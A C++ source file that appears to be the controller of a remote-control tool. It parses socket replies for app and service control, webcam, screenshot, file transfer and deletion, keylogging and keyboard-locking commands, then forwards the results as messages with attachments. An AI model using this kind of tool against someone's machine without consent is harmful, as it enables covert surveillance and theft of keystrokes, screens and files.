#include "response.h"

void processResponse(message& msg, string title, string arg, SOCKET& clientSocket) {
    string result;
    string jsonResponse;
    json j;

    if (title == START_APP) {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
        createMsg(msg, "Start App Response", j.at("result"));
    }

    else if (title == "listApps") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);
        result = processListApps(j);

        cout << result << endl;
        createMsg(msg, "List Apps Response", result);
    }

    else if (title == "listServices") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);
        result = processListServices(j);

        cout << result << endl;
        createMsg(msg, "List Services Response", result);
    }

    else if (title == "startService") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
        createMsg(msg, "Start Service Response", j.at("result"));
    }

    else if (title == "stopApp") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
        createMsg(msg, "Stop App Response", j.at("result"));
    }

    else if (title == "stopService") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
		createMsg(msg, "Stop Service Response", j.at("result"));
    }

    else if (title == "restart") {
        // process restart
    }

    else if (title == "shutdown") {
        // process shutdown
    }

    else if (title == "startWebcam") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
        createMsg(msg, "Start Webcam Response", j.at("result"));
    }

    else if (title == "stopWebcam") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
		createMsg(msg, "Stop Webcam Response", j.at("result"));
    }

    else if (title == "screenShot") {
        string fileName = "receivedData.bin";
        string binaryData = receiveFile(clientSocket);
        saveBinaryToFile(binaryData, fileName);

        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);
        
        cout << j["result"] << endl;
		createMsg(msg, "Screen Shot Response", j.at("result"));
        attachFile(msg, "screenshot.png");
    }

    else if (title == "sendFile") {
        string fileName = "receivedData.bin";
        string binaryData = receiveFile(clientSocket);
        saveBinaryToFile(binaryData, fileName);

        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);
        cout << j["result"] << endl;
		createMsg(msg, "Send File Response", j.at("result"));
        attachFile(msg, extractFileName(arg));
    }

    else if (title == "copyFile") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);
        cout << j["result"] << endl;
		createMsg(msg, "Copy File Response", j.at("result"));
    }

    else if (title == "deleteFile") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
		createMsg(msg, "Delete File Response", j.at("result"));
    }

    else if (title == "keyLogger") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        vector<string> keyNames = j["content"];

        for (int i = 0; i < keyNames.size(); i++) {
            cout << keyNames[i] << " ";
        }

        cout << endl << j["result"] << endl;
    }

    else if (title == "keyLocking") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
    }

    else if (title == "keyUnlocking") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
    }
    else {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
    }
}